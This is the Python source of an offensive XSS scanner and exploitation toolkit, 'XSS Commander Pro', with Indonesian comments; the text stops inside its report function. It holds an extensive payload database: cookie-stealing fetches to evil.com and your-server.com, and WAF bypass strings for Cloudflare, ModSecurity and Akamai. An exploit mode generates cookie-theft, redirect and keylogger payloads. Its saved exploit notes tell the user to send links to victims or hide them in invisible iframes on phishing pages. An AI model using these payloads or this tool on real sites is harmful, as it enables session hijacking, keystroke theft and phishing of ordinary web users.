#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    XSS COMMANDER PRO v2.0 - Ultimate XSS Toolkit             ║
║                    Author: SepkaScurty-CPU                                   ║
║                    Features: Detection, Exploitation, Reporting              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import requests
import sys
import argparse
import urllib.parse
import json
import time
import random
import threading
import queue
from bs4 import BeautifulSoup
from colorama import init, Fore, Style, Back
from datetime import datetime
import os
import re
import xml.etree.ElementTree as ET
import socket
import ssl
import hashlib
from fake_useragent import UserAgent
import concurrent.futures
import base64
import zlib
import html

init(autoreset=True)

class XSS_Commander_Pro:
    def __init__(self):
        self.version = "2.0"
        self.author = "SepkaScurty-CPU"
        self.session = requests.Session()
        self.ua = UserAgent()
        self.session.headers.update({'User-Agent': self.ua.random})
        
        # Database payload yang sangat lengkap
        self.payload_db = self.load_payload_database()
        
        # Konfigurasi
        self.timeout = 10
        self.max_threads = 10
        self.results = []
        self.vulnerabilities = []
        self.report_data = []
        
        # Warna untuk output
        self.colors = {
            'info': Fore.CYAN,
            'success': Fore.GREEN,
            'warning': Fore.YELLOW,
            'error': Fore.RED,
            'critical': Fore.RED + Style.BRIGHT,
            'debug': Fore.MAGENTA,
            'title': Fore.CYAN + Style.BRIGHT
        }
    
    def load_payload_database(self):
        """Load database payload dari file JSON"""
        payload_db = {
            'reflected': {
                'basic': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "<iframe src=javascript:alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<details open ontoggle=alert('XSS')>",
                    "<video><source onerror=alert('XSS')>",
                ],
                'advanced': [
                    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
                    "<img src=x onerror=\"fetch('http://evil.com/steal?c='+document.cookie)\">",
                    "<script>new Image().src='http://evil.com/?c='+document.cookie;</script>",
                    "<svg><script>fetch('http://evil.com/?'+document.cookie)</script></svg>",
                ],
                'obfuscated': [
                    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                    "<svg><script>alert&#40;'XSS'&#41</script></svg>",
                    "javascript&#58alert('XSS')",
                    "<img src=\"x\" ` onerror=alert('XSS')>",
                ],
                'polyglot': [
                    "'>\"><img src=x onerror=alert(1)>",
                    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                    "<svg/onload=alert(1)//",
                ]
            },
            'stored': {
                'comment': [
                    "<!--<img src=x onerror=alert(document.domain)>-->",
                    "<script>alert('Stored XSS')</script>",
                    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
                ],
                'profile': [
                    "<img src=x onerror=alert('Profile XSS')>",
                    "Name: <script>alert(1)</script>",
                    "Bio: <svg/onload=alert('Bio')>",
                ],
                'forum': [
                    "[img]x[/img][onload=alert('XSS')]",
                    "<marquee onstart=alert('XSS')>XSS</marquee>",
                    "<div style=\"background:url(javascript:alert('XSS'))\">",
                ]
            },
            'dom': {
                'sinks': [
                    "#<img src=x onerror=alert('DOM XSS')>",
                    "?param=<script>alert(1)</script>",
                    "#javascript:alert('XSS')",
                    "?q=<svg onload=alert(1)>",
                ],
                'sources': [
                    "document.location.hash",
                    "document.URL",
                    "document.referrer",
                    "window.name",
                ]
            },
            'blind': {
                'callback': [
                    "<script>fetch('http://your-server.com/?c='+document.cookie)</script>",
                    "<img src=x onerror=\"fetch('http://your-server.com/?c='+btoa(document.cookie))\">",
                    "<script>new Image().src='http://your-server.com/?'+document.domain;</script>",
                ],
                'port_scan': [
                    "<script>for(i=0;i<65535;i++){new Image().src='http://localhost:'+i;}</script>",
                ]
            },
            'waf_bypass': {
                'cloudflare': [
                    "<img src=x onerror=alert`1`>",
                    "<script>alert(1)</script><!--",
                    "<svg><script>alert&#40;1&#41</script></svg>",
                ],
                'modsecurity': [
                    "<img src=\"x\" ` onerror=alert(1)>",
                    "<script>window['al'+'ert'](1)</script>",
                    "<div onmouseover=\"alert(1)\">Hover</div>",
                ],
                'akamai': [
                    "<img src=x onerror=alert.call(null,1)>",
                    "<script>alert?. (1)</script>",
                    "<svg/onload=alert(1) ",
                ]
            }
        }
        
        # Tambahkan payload dari file eksternal jika ada
        try:
            if os.path.exists('payloads.json'):
                with open('payloads.json', 'r') as f:
                    external_payloads = json.load(f)
                    payload_db.update(external_payloads)
        except:
            pass
        
        return payload_db
    
    def print_banner(self):
        """Tampilkan banner yang keren"""
        banner = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║{Fore.WHITE}██████╗ ██╗  ██╗███████╗    ██████╗ ██████╗ ███╗   ███╗███╗   ███╗███████╗███╗   ██╗██████╗ ███████╗██████╗{Fore.RED} ║
║{Fore.WHITE}╚════██╗╚██╗██╔╝██╔════╝   ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗{Fore.RED}║
║{Fore.WHITE} █████╔╝ ╚███╔╝ ███████╗   ██║     ██║   ██║██╔████╔██║██╔████╔██║█████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝{Fore.RED}║
║{Fore.WHITE} ╚═══██╗ ██╔██╗ ╚════██║   ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗{Fore.RED}║
║{Fore.WHITE}██████╔╝██╔╝ ██╗███████║██╗╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║ ╚████║██████╔╝███████╗██║  ██║{Fore.RED}║
║{Fore.WHITE}╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝{Fore.RED}║
║{Fore.YELLOW}                           XSS COMMANDER PRO v{self.version} - Ultimate XSS Toolkit{Fore.RED}                                    ║
║{Fore.CYAN}                         Advanced XSS Detection & Exploitation Framework{Fore.RED}                                    ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
        
        # Info cepat
        print(f"{self.colors['title']}[*] Author: {self.author}")
        print(f"[*] Total Payloads: {sum(len(cat) for cat_type in self.payload_db.values() for cat in cat_type.values())}")
        print(f"[*] Modules: Detection, Exploitation, Scanner, Fuzzer, Analyzer")
        print(f"[*] Type: Reflected, Stored, DOM, Blind, WAF Bypass{Style.RESET_ALL}\n")
    
    def check_vulnerability(self, url, method="GET", params=None, cookies=None):
        """Cek kerentanan XSS dengan multiple techniques"""
        
        print(f"\n{self.colors['title']}[🔍] Scanning: {url}{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Method: {method}, Parameters: {params}{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # Test 1: Basic Reflection Test
        print(f"{self.colors['info']}[1/6] Testing Basic Reflection...{Style.RESET_ALL}")
        basic_vuln = self.test_reflection(url, method, params, cookies)
        if basic_vuln:
            vulnerabilities.append(("Reflected XSS", basic_vuln))
        
        # Test 2: DOM XSS Test
        print(f"{self.colors['info']}[2/6] Testing DOM XSS...{Style.RESET_ALL}")
        dom_vuln = self.test_dom_xss(url)
        if dom_vuln:
            vulnerabilities.append(("DOM XSS", dom_vuln))
        
        # Test 3: Stored XSS Test (jika ada form)
        print(f"{self.colors['info']}[3/6] Looking for Stored XSS vectors...{Style.RESET_ALL}")
        stored_vuln = self.test_stored_xss(url, cookies)
        if stored_vuln:
            vulnerabilities.append(("Stored XSS", stored_vuln))
        
        # Test 4: WAF Detection & Bypass
        print(f"{self.colors['info']}[4/6] Checking WAF & Testing Bypasses...{Style.RESET_ALL}")
        waf_info = self.detect_waf(url)
        if waf_info:
            print(f"{self.colors['warning']}[!] WAF Detected: {waf_info}{Style.RESET_ALL}")
            bypass_vuln = self.test_waf_bypass(url, method, params, cookies, waf_info)
            if bypass_vuln:
                vulnerabilities.append(("WAF Bypass XSS", bypass_vuln))
        
        # Test 5: Blind XSS Test
        print(f"{self.colors['info']}[5/6] Testing Blind XSS...{Style.RESET_ALL}")
        blind_vuln = self.test_blind_xss(url, method, params, cookies)
        if blind_vuln:
            vulnerabilities.append(("Blind XSS", blind_vuln))
        
        # Test 6: Advanced Context Analysis
        print(f"{self.colors['info']}[6/6] Analyzing Response Context...{Style.RESET_ALL}")
        context_vuln = self.analyze_context(url, method, params, cookies)
        if context_vuln:
            vulnerabilities.append(("Context-based XSS", context_vuln))
        
        # Tampilkan hasil
        self.display_scan_results(vulnerabilities, url)
        
        return vulnerabilities
    
    def test_reflection(self, url, method="GET", params=None, cookies=None):
        """Test reflected XSS"""
        test_payload = "<script>alert('XSS_TEST')</script>"
        
        try:
            if method.upper() == "GET":
                # Test di URL parameters
                parsed = urllib.parse.urlparse(url)
                query = urllib.parse.parse_qs(parsed.query)
                
                # Test setiap parameter
                for param in query.keys():
                    test_url = self.inject_payload(url, param, test_payload)
                    response = self.session.get(test_url, timeout=self.timeout, cookies=cookies)
                    
                    if test_payload in response.text:
                        # Cek jika payload di-encode
                        soup = BeautifulSoup(response.text, 'html.parser')
                        scripts = soup.find_all('script')
                        
                        for script in scripts:
                            if 'XSS_TEST' in str(script):
                                return {
                                    'parameter': param,
                                    'payload': test_payload,
                                    'url': test_url,
                                    'type': 'reflected',
                                    'context': 'script_tag'
                                }
                        
                        # Cek di atribut
                        if f"onerror=\"alert('XSS_TEST'" in response.text:
                            return {
                                'parameter': param,
                                    'payload': test_payload,
                                'url': test_url,
                                'type': 'reflected',
                                'context': 'event_handler'
                            }
                        
                        return {
                            'parameter': param,
                            'payload': test_payload,
                            'url': test_url,
                            'type': 'reflected',
                            'context': 'raw_output'
                        }
            
            elif method.upper() == "POST":
                # Test POST parameters
                if params:
                    for param in params:
                        data = {p: "test" for p in params}
                        data[param] = test_payload
                        
                        response = self.session.post(url, data=data, timeout=self.timeout, cookies=cookies)
                        
                        if test_payload in response.text:
                            return {
                                'parameter': param,
                                'payload': test_payload,
                                'url': url,
                                'type': 'reflected',
                                'context': 'post_parameter'
                            }
        
        except Exception as e:
            print(f"{self.colors['error']}[!] Error in reflection test: {e}{Style.RESET_ALL}")
        
        return None
    
    def test_dom_xss(self, url):
        """Test DOM-based XSS"""
        dom_payloads = [
            "#<img src=x onerror=alert('DOM_XSS')>",
            "#javascript:alert('DOM_XSS')",
            "?test=<script>alert('DOM')</script>",
            "#<svg onload=alert('DOM')>"
        ]
        
        for payload in dom_payloads:
            try:
                test_url = f"{url}{payload}" if "?" not in url else f"{url}&{payload[1:]}"
                
                # Gunakan selenium jika tersedia, atau manual check
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Cek tanda-tanda DOM XSS
                dom_indicators = [
                    "document.write",
                    "innerHTML",
                    "eval(",
                    "setTimeout(",
                    "setInterval(",
                    "location.hash",
                    "window.name"
                ]
                
                for indicator in dom_indicators:
                    if indicator in response.text:
                        # Cek jika payload mempengaruhi output
                        soup = BeautifulSoup(response.text, 'html.parser')
                        scripts = soup.find_all('script')
                        
                        for script in scripts:
                            if payload.replace('#', '').replace('?test=', '') in str(script):
                                return {
                                    'payload': payload,
                                    'url': test_url,
                                    'type': 'dom',
                                    'sink': indicator,
                                    'context': 'dom_manipulation'
                                }
                
            except:
                continue
        
        return None
    
    def test_stored_xss(self, url, cookies=None):
        """Cari form untuk stored XSS"""
        try:
            response = self.session.get(url, timeout=self.timeout, cookies=cookies)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            if forms:
                for form in forms:
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'GET').upper()
                    
                    # Cari input fields
                    inputs = form.find_all('input')
                    textareas = form.find_all('textarea')
                    
                    all_fields = inputs + textareas
                    
                    if all_fields:
                        # Test dengan payload stored
                        test_payload = "<img src=x onerror=alert('STORED_XSS')>"
                        
                        # Buat data form
                        form_data = {}
                        for field in all_fields:
                            field_name = field.get('name', '')
                            if field_name:
                                if field.get('type') in ['text', 'textarea', 'search', 'email']:
                                    form_data[field_name] = test_payload
                                else:
                                    form_data[field_name] = field.get('value', '')
                        
                        # Submit form
                        target_url = urllib.parse.urljoin(url, form_action)
                        
                        if form_method == "POST":
                            response = self.session.post(target_url, data=form_data, 
                                                         timeout=self.timeout, cookies=cookies)
                            
                            # Cek jika payload muncul di response
                            if test_payload in response.text:
                                return {
                                    'form_action': form_action,
                                    'payload': test_payload,
                                    'url': target_url,
                                    'type': 'stored',
                                    'method': 'POST'
                                }
            
            # Cari comment sections, profile edits, dll
            indicators = ['comment', 'review', 'message', 'post', 'profile', 'bio', 'description']
            
            for indicator in indicators:
                if indicator in response.text.lower():
                    return {
                        'potential_vector': indicator,
                        'type': 'stored',
                        'note': f'Potential stored XSS in {indicator} field'
                    }
        
        except Exception as e:
            print(f"{self.colors['error']}[!] Error in stored XSS test: {e}{Style.RESET_ALL}")
        
        return None
    
    def detect_waf(self, url):
        """Deteksi WAF yang digunakan"""
        waf_signatures = {
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'ModSecurity': ['mod_security', 'libmodsecurity'],
            'Akamai': ['akamaighost', 'akamai'],
            'Imperva': ['imperva', 'incapsula'],
            'AWS WAF': ['aws', 'awselb'],
            'Wordfence': ['wordfence'],
            'Sucuri': ['sucuri'],
            'Barracuda': ['barracuda']
        }
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            headers = response.headers
            
            for waf, signatures in waf_signatures.items():
                for sig in signatures:
                    if sig.lower() in str(headers).lower() or sig.lower() in response.text.lower():
                        return waf
            
            # Test dengan payload yang biasanya diblokir WAF
            test_payload = "<script>alert('WAF_TEST')</script>"
            test_response = self.session.get(f"{url}?test={test_payload}", timeout=self.timeout)
            
            if test_response.status_code in [403, 406, 419, 500]:
                return "Generic WAF (Blocked malicious request)"
            
            # Cek response time untuk WAF detection
            normal_time = time.time()
            normal_response = self.session.get(url, timeout=self.timeout)
            normal_time = time.time() - normal_time
            
            malicious_time = time.time()
            malicious_response = self.session.get(f"{url}?test=<script>alert(1)</script>", timeout=self.timeout)
            malicious_time = time.time() - malicious_time
            
            if malicious_time > normal_time * 2:  # Jika response time 2x lebih lama
                return "Possible WAF (Delayed response)"
        
        except:
            pass
        
        return None
    
    def test_waf_bypass(self, url, method, params, cookies, waf_type):
        """Test bypass untuk WAF tertentu"""
        bypass_payloads = []
        
        if "Cloudflare" in waf_type:
            bypass_payloads = self.payload_db['waf_bypass']['cloudflare']
        elif "ModSecurity" in waf_type:
            bypass_payloads = self.payload_db['waf_bypass']['modsecurity']
        elif "Akamai" in waf_type:
            bypass_payloads = self.payload_db['waf_bypass']['akamai']
        else:
            bypass_payloads = self.payload_db['waf_bypass']['cloudflare']  # Default
        
        for payload in bypass_payloads[:5]:  # Test 5 payload pertama
            try:
                if method.upper() == "GET":
                    parsed = urllib.parse.urlparse(url)
                    query = urllib.parse.parse_qs(parsed.query)
                    
                    if query:
                        param = list(query.keys())[0]
                        test_url = self.inject_payload(url, param, payload)
                        
                        response = self.session.get(test_url, timeout=self.timeout, cookies=cookies)
                        
                        if payload in response.text and response.status_code == 200:
                            return {
                                'waf': waf_type,
                                'payload': payload,
                                'url': test_url,
                                'type': 'waf_bypass',
                                'status': 'bypassed'
                            }
            
            except:
                continue
        
        return None
    
    def test_blind_xss(self, url, method, params, cookies):
        """Test Blind XSS dengan callback server simulasi"""
        # Simulasi blind XSS dengan payload yang akan trigger jika dieksekusi
        blind_payloads = [
            "<img src=x onerror=\"document.body.innerHTML+='BLIND_XSS_TRIGGERED';\">",
            "<script>if(window.location.href.indexOf('BLIND')===-1){document.write('BLIND_DETECTED');}</script>",
        ]
        
        for payload in blind_payloads:
            try:
                if method.upper() == "GET":
                    test_url = f"{url}?blind={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, cookies=cookies)
                    
                    # Cek jika payload menyebabkan perubahan
                    if 'BLIND_XSS_TRIGGERED' in response.text or 'BLIND_DETECTED' in response.text:
                        return {
                            'payload': payload,
                            'type': 'blind',
                            'url': test_url,
                            'note': 'Blind XSS possible (simulated detection)'
                        }
            
            except:
                continue
        
        return None
    
    def analyze_context(self, url, method, params, cookies):
        """Analisis konteks output untuk XSS yang lebih canggih"""
        try:
            response = self.session.get(url, timeout=self.timeout, cookies=cookies)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Cari semua titik output yang potensial
            analysis = {
                'script_tags': len(soup.find_all('script')),
                'event_handlers': self.count_event_handlers(response.text),
                'eval_calls': response.text.count('eval('),
                'innerhtml_usage': response.text.count('.innerHTML'),
                'document_write': response.text.count('document.write'),
                'jquery_usage': response.text.count('$(') + response.text.count('jQuery'),
                'angular_usage': response.text.count('ng-') + response.text.count('{{'),
                'vue_usage': response.text.count('v-') + response.text.count('{{'),
                'react_usage': response.text.count('React') + response.text.count('render('),
            }
            
            # Tentukan konteks yang rentan
            vulnerabilities = []
            
            if analysis['eval_calls'] > 0:
                vulnerabilities.append({
                    'type': 'context_analysis',
                    'risk': 'HIGH',
                    'reason': f"Found {analysis['eval_calls']} eval() calls - dangerous JavaScript execution",
                    'recommendation': 'Avoid eval(), use JSON.parse instead'
                })
            
            if analysis['innerhtml_usage'] > 0:
                vulnerabilities.append({
                    'type': 'context_analysis',
                    'risk': 'MEDIUM',
                    'reason': f"Found {analysis['innerhtml_usage']} .innerHTML usage - potential DOM XSS",
                    'recommendation': 'Use .textContent instead of .innerHTML'
                })
            
            if analysis['event_handlers'] > 10:
                vulnerabilities.append({
                    'type': 'context_analysis',
                    'risk': 'MEDIUM',
                    'reason': f"Found {analysis['event_handlers']} event handlers - potential event-based XSS",
                    'recommendation': 'Validate all event handler inputs'
                })
            
            if vulnerabilities:
                return {
                    'analysis': analysis,
                    'vulnerabilities': vulnerabilities,
                    'type': 'context_analysis'
                }
        
        except Exception as e:
            print(f"{self.colors['error']}[!] Error in context analysis: {e}{Style.RESET_ALL}")
        
        return None
    
    def count_event_handlers(self, text):
        """Hitung event handlers dalam HTML"""
        events = [
            'onload', 'onerror', 'onclick', 'onmouseover', 'onmouseenter',
            'onfocus', 'onblur', 'onchange', 'onsubmit', 'onkeydown',
            'onkeypress', 'onkeyup', 'onselect', 'onresize', 'onscroll'
        ]
        
        count = 0
        for event in events:
            count += text.lower().count(event)
        
        return count
    
    def inject_payload(self, url, parameter, payload):
        """Inject payload ke URL parameter"""
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        # Encode payload jika perlu
        encoded_payload = urllib.parse.quote(payload) if random.choice([True, False]) else payload
        
        query[parameter] = encoded_payload
        
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_url = urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        
        return new_url
    
    def display_scan_results(self, vulnerabilities, url):
        """Tampilkan hasil scan dengan format yang rapi"""
        print(f"\n{self.colors['title']}════════════════════════ SCAN RESULTS ════════════════════════{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Target: {url}")
        print(f"[*] Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        
        if not vulnerabilities:
            print(f"\n{self.colors['success']}[✓] No XSS vulnerabilities detected!{Style.RESET_ALL}")
            print(f"{self.colors['info']}[*] Note: This is an automated scan. Manual verification recommended.{Style.RESET_ALL}")
            return
        
        print(f"\n{self.colors['warning']}[!] Found {len(vulnerabilities)} potential XSS vulnerability(ies):{Style.RESET_ALL}")
        
        for i, (vuln_type, details) in enumerate(vulnerabilities, 1):
            print(f"\n{self.colors['critical']}[VULN #{i}] {vuln_type}{Style.RESET_ALL}")
            
            if isinstance(details, dict):
                for key, value in details.items():
                    if key not in ['analysis', 'vulnerabilities']:
                        print(f"  {Fore.YELLOW}{key}: {Fore.WHITE}{value}{Style.RESET_ALL}")
                
                if 'analysis' in details:
                    print(f"\n  {Fore.CYAN}[ANALYSIS]{Style.RESET_ALL}")
                    for key, value in details['analysis'].items():
                        print(f"    {key}: {value}")
                
                if 'vulnerabilities' in details:
                    print(f"\n  {Fore.RED}[ISSUES]{Style.RESET_ALL}")
                    for vuln in details['vulnerabilities']:
                        print(f"    • {vuln['reason']} ({vuln['risk']} Risk)")
        
        print(f"\n{self.colors['title']}══════════════════════════════════════════════════════════════{Style.RESET_ALL}")
    
    def exploit_vulnerability(self, vuln_details, exploit_type="alert", custom_payload=None):
        """Eksploit kerentanan yang ditemukan"""
        if not vuln_details:
            print(f"{self.colors['error']}[!] No vulnerability details provided{Style.RESET_ALL}")
            return
        
        print(f"\n{self.colors['title']}[⚡] EXPLOIT MODE ACTIVATED{Style.RESET_ALL}")
        
        # Pilih payload berdasarkan tipe eksploitasi
        if custom_payload:
            payload = custom_payload
        elif exploit_type == "alert":
            payload = "<script>alert('EXPLOITED_BY_XCP')</script>"
        elif exploit_type == "cookie_steal":
            payload = "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
        elif exploit_type == "redirect":
            payload = "<script>window.location='https://evil.com'</script>"
        elif exploit_type == "keylogger":
            payload = """
            <script>
            document.onkeypress = function(e) {
                fetch('https://evil.com/log?key=' + e.key);
            }
            </script>
            """
        else:
            payload = "<script>alert('XSS_Exploit')</script>"
        
        # Eksploit berdasarkan tipe vuln
        vuln_type = vuln_details.get('type', '')
        target_url = vuln_details.get('url', '')
        parameter = vuln_details.get('parameter', '')
        
        if vuln_type == 'reflected' and parameter:
            exploit_url = self.inject_payload(target_url.split('?')[0], parameter, payload)
            
            print(f"{self.colors['info']}[*] Exploiting Reflected XSS...{Style.RESET_ALL}")
            print(f"{self.colors['warning']}[!] Exploit URL: {exploit_url}{Style.RESET_ALL}")
            
            # Test exploit
            try:
                response = self.session.get(exploit_url, timeout=self.timeout)
                if payload.split('>')[0] in response.text:
                    print(f"{self.colors['success']}[✓] Exploit successful! Payload executed.{Style.RESET_ALL}")
                    
                    # Simpan exploit ke file
                    self.save_exploit(exploit_url, payload, vuln_details)
                else:
                    print(f"{self.colors['error']}[!] Exploit may have failed{Style.RESET_ALL}")
            
            except Exception as e:
                print(f"{self.colors['error']}[!] Exploit error: {e}{Style.RESET_ALL}")
        
        elif vuln_type == 'stored':
            print(f"{self.colors['info']}[*] Stored XSS Exploit - Manual intervention required{Style.RESET_ALL}")
            print(f"{self.colors['warning']}[!] Use this payload in the vulnerable form:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}")
        
        elif vuln_type == 'dom':
            print(f"{self.colors['info']}[*] DOM XSS Exploit{Style.RESET_ALL}")
            print(f"{self.colors['warning']}[!] Navigate to: {target_url}{payload}{Style.RESET_ALL}")
        
        else:
            print(f"{self.colors['error']}[!] Unknown vulnerability type for exploitation{Style.RESET_ALL}")
    
    def save_exploit(self, url, payload, vuln_details):
        """Simpan exploit ke file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"xss_exploit_{timestamp}.txt"
        
        exploit_data = f"""
╔══════════════════════════════════════════════════╗
║           XSS EXPLOIT BY SepkaScurty-CPU         ║
║           Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}           ║
╚══════════════════════════════════════════════════╝

[VULNERABILITY DETAILS]
Type: {vuln_details.get('type', 'Unknown')}
Parameter: {vuln_details.get('parameter', 'N/A')}
Context: {vuln_details.get('context', 'N/A')}

[EXPLOIT URL]
{url}

[PAYLOAD]
{payload}

[EXPLOITATION INSTRUCTIONS]
1. Send the exploit URL to victim
2. Or embed in phishing page: <iframe src="{url}" width="0" height="0"></iframe>
3. For stored XSS, submit payload through vulnerable form

[REMINDER]
- Use only for authorized testing
- Get proper permission before exploitation
- Report vulnerabilities responsibly
"""
        
        with open(filename, 'w') as f:
            f.write(exploit_data)
        
        print(f"{self.colors['success']}[✓] Exploit saved to: {filename}{Style.RESET_ALL}")
    
    def full_scan(self, url, depth=2):
        """Full comprehensive scan dengan crawling"""
        print(f"{self.colors['title']}[🌐] STARTING FULL SCAN{Style.RESET_ALL}")
        print(f"{self.colors['info']}[*] Target: {url}")
        print(f"[*] Depth: {depth}{Style.RESET_ALL}")
        
        # Crawl halaman
        pages_to_scan = self.crawl_website(url, depth)
        
        print(f"\n{self.colors['info']}[*] Found {len(pages_to_scan)} pages to scan{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        # Multi-threaded scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for page_url in pages_to_scan:
                futures.append(executor.submit(self.check_vulnerability, page_url))
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        all_vulnerabilities.extend(result)
                except Exception as e:
                    print(f"{self.colors['error']}[!] Scan error: {e}{Style.RESET_ALL}")
        
        # Generate report
        self.generate_report(all_vulnerabilities, url)
        
        return all_vulnerabilities
    
    def crawl_website(self, url, max_depth=2):
        """Crawl website untuk menemukan halaman lain"""
        visited = set()
        to_visit = [(url, 0)]
        all_pages = []
        
        try:
            while to_visit:
                current_url, depth = to_visit.pop(0)
                
                if current_url in visited or depth > max_depth:
                    continue
                
                visited.add(current_url)
                all_pages.append(current_url)
                
                if depth < max_depth:
                    try:
                        response = self.session.get(current_url, timeout=self.timeout)
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        # Cari semua link
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            
                            # Normalisasi URL
                            full_url = urllib.parse.urljoin(current_url, href)
                            
                            # Filter hanya URL yang sama domain
                            if urllib.parse.urlparse(full_url).netloc == urllib.parse.urlparse(url).netloc:
                                if full_url not in visited and full_url not in [u for u, _ in to_visit]:
                                    to_visit.append((full_url, depth + 1))
                    
                    except:
                        continue
        
        except Exception as e:
            print(f"{self.colors['error']}[!] Crawling error: {e}{Style.RESET_ALL}")
        
        return all_pages
    
    def generate_report(self, vulnerabilities, url):
        """Generate laporan HTML yang detail"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"xss_report_{timestamp}.html"
        
        # Hitung statistik
        total_vulns = len(vulnerabilities)
        vuln_types = {}
        
        for vuln_type, details in vulnerabilities:
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
        
        # Buat laporan HTML
        html_report = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS Scan Report - {url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #1a1a1a; color: #fff; }}
        .container {{ max-width: 1200px; margin: auto; }}
        .header {{ background: #d32f2f; padding: 20px; border-radius: 10px; margin-bottom: 30px; }}
        .summary {{ background: #2c3e50; padding: 20px; border-radius: 10px; margin-bottom: 20px; }}
        .vulnerability {{ background: #34495e; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 5px solid #e74c3c; }}
        .critical {{ border-left-color: #e74c3c; }}
        .high {{ border-left-color: #e67e22; }}
        .medium {{ border-left-color: #f1c40f; }}
        .low {{ border-left-color: #3498db; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #444; }}
        th {{ background: #2c3e50; }}
        .recommendation {{ background: #27ae60; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        .timestamp {{ color: #95a5a6; font-size: 0.9em; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 XSS Vulnerability Scan Report</h1>
            <p class="timestamp">Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        </div>
        
        <div class="summary">
            <h2>📊 Executive Summary</h2>
            <table>
                <tr>
                    <th>Target URL</th>
                    <td>{url}</td>
                </tr>
                <tr>
                    <th>Total Vulnerabilities</th>
                    <td style="color: {'#e74c3c' if total_vulns > 0 else '#2ecc71'}">{total_vulns}</td>
                </tr>
                <tr>
                    <th>Scan Duration</th>
                    <td>{datetime.now().strftime("%H:%M:%S")}</td>
                </tr>
                <tr>
                    <th>Scanner</th>
                    <td>XSS Commander Pro v{self.version}</td>
                </tr>
            </table>
            
            <h3>Vulnerability Breakdown</h3>
            <table>
                {"".join(f"<tr><td>{vtype}</td><td>{count}</td></tr>" for vtype, count in vuln_types.items())}
            </table>
        </div>
        
        <div class="recommendation">
            <h3>🛡️ Security Recommendations</h3>
            <ul>
                <li>Implement Content Security Policy (CSP) headers</li>
                <li>Use proper input validation and output encoding</li>
                <li>Enable X-XSS-Protection header</li>
                <li>Regular security testing and code review</li>
                <li>Use Web Application Firewall (WAF)</li>
            </ul>
        </div>
        
        <h2>🔍 Detailed Findings</h2>
"""
        
        # Tambahkan setiap vulnerability
        for i, (vuln_type, details) in enumerate(vulnerabilities, 1):
            risk_level = "high" if "critical" in vuln_type.lower() else "medium"
            
            html_report += f"""
        <div class="vulnerability {risk_level}">
            <h3>Vulnerability #{i}: {vuln_type}</h3>
            <table>
"""
            
            if isinstance(details, dict):
                for key, value in details.items():
                    if key not in ['analysis', 'vulnerabilities']:
                        html_report += f"""
                <tr>
                    <th>{key.replace('_', ' ').title()}</th>
                    <td>{value}</td>
                </tr>
"""
            
            html_report += """
            </table>
        </div>
"""
        
        html_report += """
        <div style="margin-top: 50px; padding: 20px; text-align: center; color: #95a5a6;">
            <p>Report generated by XSS Commander Pro | For authorized testing only</p>
            <p>⚠️ This report contains sensitive security information. Handle with care.</p>
        </div>
    </div>
</body>
</html>
"""
        
